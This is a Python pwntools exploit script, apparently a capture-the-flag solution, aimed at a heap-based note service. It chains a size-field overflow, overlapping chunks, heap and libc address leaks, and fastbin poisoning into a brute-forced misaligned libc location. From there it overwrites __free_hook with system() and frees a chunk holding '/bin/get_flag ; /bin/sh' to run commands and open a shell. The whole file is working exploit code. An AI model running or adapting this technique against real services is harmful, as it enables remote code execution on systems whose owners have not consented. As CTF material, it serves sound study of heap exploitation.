#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, p32, p16, p8, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky3"
port = 13722
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


spawn_interactive_shell = False

cmd_allocate = b"1\n"
cmd_free     = b"2\n"
cmd_fill     = b"3\n"
cmd_dump     = b"4\n"

prompt_newcmd = b"> "
prompt_allocate_size = b"What size to allocate? "
prompt_index = b"Index: "
prompt_length = b"Length: "

marker_menutop = b"-------------------------------------------\n"

flag_prev_in_use = 0x1

verbose_mode = False
manual_step_mode = False

#This is where the exploit lives.
def exploit():

    flag = b""

    while not b"flag" in flag:
        proc = remote(host, port, fam="ipv4")

        print(proc.readuntil(b"S\033[0;37mervice\n").decode())

        #allocate chunk of size 0x20 at index 0
        print("(-) Allocating chunk of size 0x20 at index 0.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x10\n")

        #allocate chunk of size 0x20 at index 1
        print("(-) Allocating chunk of size 0x20 at index 1.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x10\n")

        #allocate chunk of size 0x90 at index 2
        print("(-) Allocating chunk of size 0x90 at index 2.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x80\n")

        #allocate chunk of size 0x20 at index 3
        print("(-) Allocating chunk of size 0x20 at index 3.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x10\n")

        #allocate chunk of size 0x90 at index 4
        print("(-) Allocating chunk of size 0x90 at index 4.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x80\n")

        #allocate chunk of size 0x20 at index 5
        print("(-) Allocating chunk of size 0x20 at index 5.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x10\n")


        #allocate chunk of size 0x20 at index 6, 0x30 at index 8, ...
        print(f"(-) Allocating chunk of size 0x40 at index 6.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x30\n")

        #allocate chunk of size 0x20 at index 7, 9, 11, ...
        print(f"(-) Allocating chunk of size 0x20 at index 7.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x10\n")

        #fill chunk at index 0 to overflow into size of chunk 1
        #set size of chunk 1 to 0x90+0x20=0xb0 with prev_in_use flag set
        print("(-) Filling chunk at index 0 to manipulate size of chunk at index 1 with overflow (0x20 --> 0x20+0x90 = 0xb0) and placing string b'/bin/get_flag ; /bin/sh\\x00' in memory.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_fill)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0\n")
        tmp_response = proc.readuntil(prompt_length)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x19\n") #override lowest bytes size field of chunk at index 1
        #proc.write(24*b"A" + b"\xb1")
        #NOTE: that length of string "/bin/get_flag ; /bin/sh\x00" is important.
        #      Do not make it longer!
        #      Padding would be needed for shorter string.
        proc.write(b"/bin/get_flag ; /bin/sh\x00" + b"\xb1")

        #free chunk of (faked) size 0xb0 from index 1 (actual size: 0x20)
        print("(-) Freeing artificially enlarged chunk at index 1.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_free)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"1\n")

        #allocate chunk of size 0xb0 in artificially enlarged free chunk at index 2
        #  --> allocated chunk at index 2 then contains chunk at index 3
        print("(-) Allocating enlarged chunk at index 1 to create chunk overlap.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0xa0\n")

        print("(-) Filling (overlapping) chunk at index 1 to reset size of (overlapped) chunk at index 2 that has been overwritten during allocation of chunk at index 1 with calloc().")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_fill)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"1\n")
        tmp_response = proc.readuntil(prompt_length)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x19\n") #override lowest bytes size field of chunk at index 1
        proc.write(24*b"\x00" + b"\x91")

        #free chunk of size 0x90 from index 4
        print("(-) Freeing chunk at index 4 to insert it into unsorted bin and set fd/bw pointers.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_free)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"4\n")

        #free chunk of size 0x90 from index 2
        print("(-) Freeing chunk at index 2 (the overlapped one) to insert it into unsorted bin and set fd/bw pointers.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_free)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"2\n")

        #dump content of chunk at index 1 to leak heap addresses and libc address
        print("(-) Dumping content of chunk at index 1 to leak heap address via forward pointer and libc address via backward pointer of chunk at index 2 using overlap.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_dump)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"1")

        #extract leaked libc and heap addresses
        tmp_leak = proc.readuntil(marker_menutop)
        if verbose_mode: print(tmp_leak)
        addr_heap_leak = int.from_bytes(tmp_leak[(4*8) : (5*8)], byteorder='little')
        print(f"(-) Leaked address on heap via forward pointer of chunk at index 2: {addr_heap_leak:#0{0}18x}")
        addr_libc_leak = int.from_bytes(tmp_leak[(5*8) : (6*8)], byteorder='little')
        print(f"(-) Leaked address in libc via backward pointer of chunk at index 2: {addr_libc_leak:#0{0}18x}")

        #TRY WITH LIBC OFFSET 0x39AC37:
        #this offset has random val as lowest byte due to shifted allignment 
        #and is rather close to free hook!!!!

        print(f"(-) Freeing chunk at index 6 to insert it into fastbin 0x40.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_free)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"6\n")


        addr_heap_topchunk_header = addr_heap_leak + 0xB0
        addr_libc_base = addr_libc_leak - 0x399B58
        addr_libc_system = addr_libc_base + 0x3f480
        addr_libc_mainarena_mallochook = addr_libc_leak - 0x68
        offset_topchunk_to_libc_mallochook = addr_libc_mainarena_mallochook - addr_heap_topchunk_header - 0x10
        addr_libc_data_NEWusefulsizelocation = addr_libc_base + 0x39AC37
        print(f"(-) Betting on valid fastbin chunk size at memory location {addr_libc_data_NEWusefulsizelocation:#0{0}18x} (single random byte via intentionally misalligned address).")


        print(f"(-) Filling chunk at index 5 to manipulate forward pointer of chunk at index 6 to point to {addr_libc_data_NEWusefulsizelocation:#0{0}18x}.")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_fill)
        tmp_response = proc.readuntil(prompt_index)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"5\n")
        tmp_response = proc.readuntil(prompt_length)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x28\n") #override lowest bytes size field of chunk at index 1
        proc.write(16*b"A" + p64(0x0) + p64(0x40 | flag_prev_in_use) + p64(addr_libc_data_NEWusefulsizelocation))

        print("(-) Allocating (fastbin) chunk of size 0x40 at index 6 using memory from manipulated fastbin (forward pointer points to fake chunk location).")
        if manual_step_mode: input()
        tmp_response = proc.readuntil(prompt_newcmd)
        if verbose_mode: print(tmp_response.decode())
        proc.write(cmd_allocate)
        tmp_response = proc.readuntil(prompt_allocate_size)
        if verbose_mode: print(tmp_response.decode())
        proc.write(b"0x30\n")


        try:
            #This will only succeed sometimes (bruteforce random byte to be valit fastbin size)
            print("(-) Hopefully allocating (faked) fastbin chunk (within libc .data section) at index 2.")
            if manual_step_mode: input()
            tmp_response = proc.readuntil(prompt_newcmd)
            if verbose_mode: print(tmp_response.decode())
            proc.write(cmd_allocate)
            tmp_response = proc.readuntil(prompt_allocate_size)
            if verbose_mode: print(tmp_response.decode())
            proc.write(b"0x30\n")


            #FILL TO FREE HOOK
            # with 0xb41*b"\x00"

            print("(-) Attmpting to fill .data section of libc from fakechunk to __free_hook and placing address of system@libc in __free_hook.")
            if manual_step_mode: input()
            tmp_response = proc.readuntil(prompt_newcmd)
            if verbose_mode: print(tmp_response.decode())
            proc.write(cmd_fill)
            tmp_response = proc.readuntil(prompt_index)
            if verbose_mode: print(tmp_response.decode())
            proc.write(b"2\n")
            tmp_response = proc.readuntil(prompt_length)
            if verbose_mode: print(tmp_response.decode())
            proc.write(b"0xb49\n")
            proc.write(0xb41*b"\x00" + p64(addr_libc_system) ) #+ p64(addr_libc_system) + b"\n")

            #FREE very first 0x20 note with b'/bin/get_flag ; /bin/sh\x00' string in it
            print("(-) Freeing chunk at index 0 to call system() on b'/bin/get_flag ; /bin/sh\\x00' via __free_hook.")
            if manual_step_mode: input()
            tmp_response = proc.readuntil(prompt_newcmd)
            if verbose_mode: print(tmp_response.decode())
            proc.write(cmd_free)
            tmp_response = proc.readuntil(prompt_index)
            if verbose_mode: print(tmp_response.decode())
            proc.write(b"0\n")

            if manual_step_mode: input()
            flag = proc.readline()
            if b"flag" in flag:
                print(f"(-) Successfully retrieved flag: {flag.decode()}")
                if spawn_interactive_shell == True:
                    proc.interactive()
            else:
                print("(-) Got response but found no flag...")

        except EOFError:
            print("(-) Failed to retrieve flag (EOFError). Random size byte probably didn't fit our fastbin...")
            print("")
        finally:
            proc.close()


#Invoke the exploit when the script is executed.
exploit()


